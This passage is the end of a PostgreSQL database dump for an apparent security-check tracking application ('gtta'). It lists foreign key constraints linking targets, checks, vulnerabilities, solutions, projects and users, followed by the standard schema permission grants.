    ADD CONSTRAINT target_check_inputs_target_id_fkey FOREIGN KEY (target_id) REFERENCES targets(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2180 (class 2606 OID 27269)
-- Dependencies: 2111 174 174 176 176
-- Name: target_check_inputs_target_id_fkey1; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_inputs
    ADD CONSTRAINT target_check_inputs_target_id_fkey1 FOREIGN KEY (target_id, check_id) REFERENCES target_checks(target_id, check_id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2181 (class 2606 OID 27214)
-- Dependencies: 2081 155 175
-- Name: target_check_solutions_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_solutions
    ADD CONSTRAINT target_check_solutions_check_id_fkey FOREIGN KEY (check_id) REFERENCES checks(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2182 (class 2606 OID 27219)
-- Dependencies: 175 152 2077
-- Name: target_check_solutions_check_solution_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_solutions
    ADD CONSTRAINT target_check_solutions_check_solution_id_fkey FOREIGN KEY (check_solution_id) REFERENCES check_solutions(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2183 (class 2606 OID 27224)
-- Dependencies: 175 178 2115
-- Name: target_check_solutions_target_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_solutions
    ADD CONSTRAINT target_check_solutions_target_id_fkey FOREIGN KEY (target_id) REFERENCES targets(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2184 (class 2606 OID 27229)
-- Dependencies: 175 175 176 176 2111
-- Name: target_check_solutions_target_id_fkey1; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_solutions
    ADD CONSTRAINT target_check_solutions_target_id_fkey1 FOREIGN KEY (target_id, check_id) REFERENCES target_checks(target_id, check_id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2202 (class 2606 OID 27194)
-- Dependencies: 155 2081 191
-- Name: target_check_vulns_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_vulns
    ADD CONSTRAINT target_check_vulns_check_id_fkey FOREIGN KEY (check_id) REFERENCES checks(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2203 (class 2606 OID 27199)
-- Dependencies: 178 2115 191
-- Name: target_check_vulns_target_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_vulns
    ADD CONSTRAINT target_check_vulns_target_id_fkey FOREIGN KEY (target_id) REFERENCES targets(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2205 (class 2606 OID 27209)
-- Dependencies: 191 176 176 2111 191
-- Name: target_check_vulns_target_id_fkey1; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_vulns
    ADD CONSTRAINT target_check_vulns_target_id_fkey1 FOREIGN KEY (target_id, check_id) REFERENCES target_checks(target_id, check_id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2204 (class 2606 OID 27204)
-- Dependencies: 180 2119 191
-- Name: target_check_vulns_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_check_vulns
    ADD CONSTRAINT target_check_vulns_user_id_fkey FOREIGN KEY (user_id) REFERENCES users(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2185 (class 2606 OID 22030)
-- Dependencies: 2081 155 176
-- Name: target_checks_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_checks
    ADD CONSTRAINT target_checks_check_id_fkey FOREIGN KEY (check_id) REFERENCES checks(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2186 (class 2606 OID 22035)
-- Dependencies: 2093 176 162
-- Name: target_checks_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_checks
    ADD CONSTRAINT target_checks_language_id_fkey FOREIGN KEY (language_id) REFERENCES languages(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2187 (class 2606 OID 22040)
-- Dependencies: 178 176 2115
-- Name: target_checks_target_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_checks
    ADD CONSTRAINT target_checks_target_id_fkey FOREIGN KEY (target_id) REFERENCES targets(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2188 (class 2606 OID 22045)
-- Dependencies: 180 176 2119
-- Name: target_checks_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_checks
    ADD CONSTRAINT target_checks_user_id_fkey FOREIGN KEY (user_id) REFERENCES users(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2189 (class 2606 OID 22050)
-- Dependencies: 2099 168 177
-- Name: target_references_reference_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_references
    ADD CONSTRAINT target_references_reference_id_fkey FOREIGN KEY (reference_id) REFERENCES "references"(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2190 (class 2606 OID 22055)
-- Dependencies: 2115 178 177
-- Name: target_references_target_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY target_references
    ADD CONSTRAINT target_references_target_id_fkey FOREIGN KEY (target_id) REFERENCES targets(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2191 (class 2606 OID 27169)
-- Dependencies: 178 166 2097
-- Name: targets_project_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY targets
    ADD CONSTRAINT targets_project_id_fkey FOREIGN KEY (project_id) REFERENCES projects(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- TOC entry 2192 (class 2606 OID 22065)
-- Dependencies: 2085 158 180
-- Name: users_client_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY users
    ADD CONSTRAINT users_client_id_fkey FOREIGN KEY (client_id) REFERENCES clients(id) ON UPDATE CASCADE ON DELETE SET NULL;


--
-- TOC entry 2260 (class 0 OID 0)
-- Dependencies: 6
-- Name: public; Type: ACL; Schema: -; Owner: postgres
--

REVOKE ALL ON SCHEMA public FROM PUBLIC;
REVOKE ALL ON SCHEMA public FROM postgres;
GRANT ALL ON SCHEMA public TO postgres;
GRANT ALL ON SCHEMA public TO PUBLIC;


-- Completed on 2012-11-30 13:13:30 MSK

--
-- PostgreSQL database dump complete
--

